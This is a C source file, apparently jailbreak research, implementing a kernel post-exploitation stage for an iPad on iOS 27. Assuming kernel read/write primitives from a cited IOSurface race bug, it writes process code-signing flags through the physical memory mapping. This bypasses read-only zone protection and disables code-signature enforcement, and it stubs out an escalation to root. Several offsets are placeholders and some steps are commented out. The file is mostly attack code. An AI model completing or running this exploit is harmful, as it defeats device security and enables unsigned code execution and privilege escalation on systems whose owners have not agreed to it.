/*
 * Physical Aperture ROZONE Bypass for SPTM Devices
 * Educational jailbreak research only. For use on devices you own.
 *
 * On SPTM devices (A15+, iOS 17+), the kernel's read-only zones (proc_ro,
 * ucred, etc.) are protected by SPTM page table types that make the virtual
 * mapping read-only. However, the kernel's physical aperture (physmap) provides
 * a SEPARATE read-write mapping of all physical memory.
 *
 * The kernel itself uses this path: pmap_ro_zone_memcpy_internal() does:
 *   pa = kvtophys(va + offset);
 *   memcpy(phystokv(pa), new_data, size);  // writes through physmap
 *
 * With kernel R/W primitives (from IOSurface race, CVE-2026-112477), we can:
 * 1. Find our proc_ro structure
 * 2. Compute the physical aperture address of p_csflags
 * 3. Write CS_DEBUGGED | CS_PLATFORM_BINARY to bypass code signing
 * 4. Run unsigned code without touching TXM or trust caches
 *
 * Target: iPad Mini (iPad16,1), A17 Pro, iOS 27.0.1
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>

/* Code signing flags from osfmk/kern/cs_blobs.h */
#define CS_VALID            0x00000001
#define CS_ADHOC            0x00000002
#define CS_GET_TASK_ALLOW   0x00000004
#define CS_INSTALLER        0x00000008
#define CS_FORCED_LV        0x00000010
#define CS_INVALID_ALLOWED  0x00000020
#define CS_HARD             0x00000100
#define CS_KILL             0x00000200
#define CS_DEBUGGED         0x10000000
#define CS_PLATFORM_BINARY  0x04000000
#define CS_PLATFORM_PATH    0x08000000
#define CS_DYLD_PLATFORM    0x02000000

/* Kernel globals we need to find from kernelcache or via info leak */
static uint64_t gVirtBase = 0;    /* kernel virtual base */
static uint64_t gPhysBase = 0;    /* kernel physical base */
static uint64_t kernel_slide = 0; /* KASLR slide */

/* Kernel R/W primitives (provided by IOSurface exploit) */
extern uint64_t kread64(uint64_t addr);
extern uint32_t kread32(uint64_t addr);
extern void kwrite64(uint64_t addr, uint64_t val);
extern void kwrite32(uint64_t addr, uint32_t val);

/*
 * Convert kernel virtual address to physical address.
 * Equivalent to kvtophys() in XNU.
 */
static uint64_t
kvtophys(uint64_t va)
{
    return va - gVirtBase + gPhysBase;
}

/*
 * Convert physical address to kernel virtual address via physical aperture.
 * Equivalent to phystokv() in XNU.
 */
static uint64_t
phystokv(uint64_t pa)
{
    return pa - gPhysBase + gVirtBase;
}

/*
 * Write to a ROZONE address through the physical aperture.
 * This bypasses SPTM's read-only page table protection because
 * the physical aperture has a separate RW mapping.
 */
static void
rozone_write32(uint64_t rozone_va, uint32_t value)
{
    uint64_t pa = kvtophys(rozone_va);
    uint64_t physmap_va = phystokv(pa);
    kwrite32(physmap_va, value);
}

static uint32_t
rozone_read32(uint64_t rozone_va)
{
    uint64_t pa = kvtophys(rozone_va);
    uint64_t physmap_va = phystokv(pa);
    return kread32(physmap_va);
}

/*
 * Find gVirtBase and gPhysBase from the kernelcache.
 * These are needed for kvtophys/phystokv conversions.
 *
 * Method 1: Read from known kernel symbol offsets
 * Method 2: Scan for them in kernel __DATA segment
 */
static int
find_physmap_globals(uint64_t kbase)
{
    /*
     * gVirtBase and gPhysBase offsets vary per iOS version.
     * For iOS 27.0.1 (xnu-12377.x), they can be found by:
     * 1. Looking for the _gVirtBase and _gPhysBase symbols in kernelcache
     * 2. Scanning for the pattern: adjacent 64-bit values where
     *    gVirtBase is in kernel range (0xFFFFFE...) and
     *    gPhysBase is a small physical address (0x800000000 range on A17)
     *
     * For now, these offsets must be determined from the IPSW kernelcache
     * and hardcoded for the target device.
     */

    /* TODO: Fill from IPSW analysis of iPad16,1 27.0.1 kernelcache */
    /* Example offsets (PLACEHOLDER - must be determined): */
    /* uint64_t gVirtBase_offset = 0xXXXXXX; */
    /* uint64_t gPhysBase_offset = 0xXXXXXX; */
    /* gVirtBase = kread64(kbase + gVirtBase_offset); */
    /* gPhysBase = kread64(kbase + gPhysBase_offset); */

    if (gVirtBase == 0 || gPhysBase == 0) {
        fprintf(stderr, "[-] Failed to find gVirtBase/gPhysBase\n");
        return -1;
    }

    printf("[+] gVirtBase = 0x%llx\n", gVirtBase);
    printf("[+] gPhysBase = 0x%llx\n", gPhysBase);
    return 0;
}

/*
 * Find our process's proc struct and proc_ro.
 *
 * Method: Walk the allproc list (linked list of all processes)
 * starting from the kernel's _allproc symbol, matching on our PID.
 */
static uint64_t
find_our_proc(uint64_t kbase)
{
    pid_t our_pid = getpid();

    /*
     * allproc offset must be determined from IPSW kernelcache.
     * The allproc list is a TAILQ_HEAD in the kernel's __DATA segment.
     *
     * Walk: proc->p_list.le_next until we find proc->p_pid == our_pid
     *
     * Struct offsets for iOS 27.0.1 (must be from kernelcache analysis):
     * - p_list.le_next at offset 0x0 (or 0x8)
     * - p_pid at offset 0xXX
     * - p_proc_ro at offset 0xXX
     */

    /* TODO: Fill from IPSW analysis */
    /* uint64_t allproc_offset = 0xXXXX; */
    /* uint64_t p_list_next_off = 0x0; */
    /* uint64_t p_pid_off = 0xXX; */
    /* uint64_t p_proc_ro_off = 0xXX; */

    uint64_t allproc = 0; /* kbase + allproc_offset; */
    uint64_t proc = kread64(allproc);

    (void)our_pid;
    (void)proc;

    /* Walk proc list */
    /*
    while (proc != 0) {
        pid_t pid = kread32(proc + p_pid_off);
        if (pid == our_pid) {
            return proc;
        }
        proc = kread64(proc + p_list_next_off);
    }
    */

    fprintf(stderr, "[-] Our proc not found in allproc\n");
    return 0;
}

/*
 * Get proc_ro pointer from proc struct.
 */
static uint64_t
get_proc_ro(uint64_t proc_addr)
{
    /* p_proc_ro offset must be from kernelcache analysis */
    /* uint64_t p_proc_ro_off = 0xXX; */
    /* return kread64(proc_addr + p_proc_ro_off); */
    (void)proc_addr;
    return 0;
}

/*
 * Modify cs_flags through the physical aperture.
 * This is the core of the SPTM bypass.
 */
static int
bypass_code_signing(uint64_t proc_ro_addr)
{
    /*
     * proc_ro->p_csflags offset within struct proc_ro:
     * Based on proc_ro.h analysis:
     *   pr_proc:     0x00  (8 bytes)
     *   pr_task:     0x08  (8 bytes)
     *   p_uniqueid:  0x10  (8 bytes)
     *   p_idversion: 0x18  (4 bytes)
     *   p_orig_ppid: 0x1C  (4 bytes)
     *   p_orig_ppidversion: 0x20 (4 bytes)
     *   p_csflags:   0x24  (4 bytes)  <-- TARGET
     *
     * NOTE: These offsets may differ due to alignment/packing.
     * Must verify from kernelcache or runtime analysis.
     */
    uint64_t p_csflags_off = 0x24; /* PLACEHOLDER — verify from kernelcache */

    uint64_t csflags_addr = proc_ro_addr + p_csflags_off;

    /* Read current flags */
    uint32_t current_flags = rozone_read32(csflags_addr);
    printf("[*] Current cs_flags: 0x%08x\n", current_flags);

    /* Set CS_DEBUGGED to bypass code signature checks */
    /* Set CS_PLATFORM_BINARY to get platform-level trust */
    /* Set CS_GET_TASK_ALLOW for debugger attachment */
    /* Clear CS_HARD and CS_KILL to prevent process kill on invalid sig */
    uint32_t new_flags = current_flags;
    new_flags |= CS_DEBUGGED;
    new_flags |= CS_PLATFORM_BINARY;
    new_flags |= CS_GET_TASK_ALLOW;
    new_flags &= ~CS_HARD;
    new_flags &= ~CS_KILL;

    /* Write through physical aperture */
    rozone_write32(csflags_addr, new_flags);

    /* Verify the write */
    uint32_t verify = rozone_read32(csflags_addr);
    if (verify != new_flags) {
        fprintf(stderr, "[-] cs_flags write failed! Got 0x%08x, expected 0x%08x\n",
                verify, new_flags);
        return -1;
    }

    printf("[+] cs_flags modified: 0x%08x -> 0x%08x\n", current_flags, new_flags);
    printf("[+] CS_DEBUGGED | CS_PLATFORM_BINARY | CS_GET_TASK_ALLOW set\n");
    printf("[+] CS_HARD | CS_KILL cleared\n");
    return 0;
}

/*
 * Also modify ucred for root (uid 0) — ucred is also in proc_ro.
 * p_ucred is an SMR_POINTER in proc_ro, pointing to a struct ucred
 * which may also be in a ROZONE.
 */
static int
escalate_to_root(uint64_t proc_ro_addr)
{
    /*
     * ucred offset in proc_ro: after p_csflags
     * SMR_POINTER(struct ucred *) p_ucred at offset 0x28 (after p_csflags)
     *
     * struct ucred contains:
     *   cr_uid:  effective user ID
     *   cr_ruid: real user ID
     *   cr_svuid: saved user ID
     *   cr_rgid: real group ID
     *   cr_groups: group list
     *
     * We need to either:
     * a) Find kernel_task's ucred and copy it to our process
     * b) Modify our ucred fields to uid=0, gid=0
     *
     * Since ucred may also be in ROZONE, we use the same physmap bypass.
     */

    /* TODO: Implement once offsets are known from IPSW analysis */
    (void)proc_ro_addr;
    printf("[*] Root escalation: TODO — need ucred offsets from kernelcache\n");
    return 0;
}

/*
 * After cs_flags and ucred modification, we can:
 * 1. Load unsigned dylibs (CS_DEBUGGED allows invalid pages)
 * 2. Use MAP_JIT for code generation
 * 3. Fork/exec unsigned binaries (CS_PLATFORM_BINARY trusts them)
 * 4. Install Sileo/Procursus bootstrap to /var/jb/
 *
 * This approach completely avoids:
 * - Trust cache injection (TXM)
 * - Page table modification (SPTM)
 * - Image4 manifest forgery
 * - Coprocessor exploitation (Titan-style)
 */

int
physmap_bypass_main(uint64_t kbase)
{
    printf("[*] SPTM Physical Aperture ROZONE Bypass\n");
    printf("[*] Target: iPad16,1 (A17 Pro), iOS 27.0.1\n\n");

    /* Step 1: Find physical aperture globals */
    if (find_physmap_globals(kbase) != 0) {
        return -1;
    }

    /* Step 2: Find our proc */
    uint64_t proc = find_our_proc(kbase);
    if (proc == 0) {
        return -1;
    }
    printf("[+] Found our proc at 0x%llx\n", proc);

    /* Step 3: Get proc_ro */
    uint64_t proc_ro = get_proc_ro(proc);
    if (proc_ro == 0) {
        return -1;
    }
    printf("[+] proc_ro at 0x%llx\n", proc_ro);

    /* Step 4: Bypass code signing via physical aperture */
    if (bypass_code_signing(proc_ro) != 0) {
        return -1;
    }

    /* Step 5: Escalate to root */
    if (escalate_to_root(proc_ro) != 0) {
        fprintf(stderr, "[-] Root escalation failed (non-fatal)\n");
    }

    printf("\n[+] SPTM bypass complete!\n");
    printf("[+] Process now has CS_DEBUGGED | CS_PLATFORM_BINARY\n");
    printf("[+] Can load unsigned code and install jailbreak bootstrap\n");

    return 0;
}
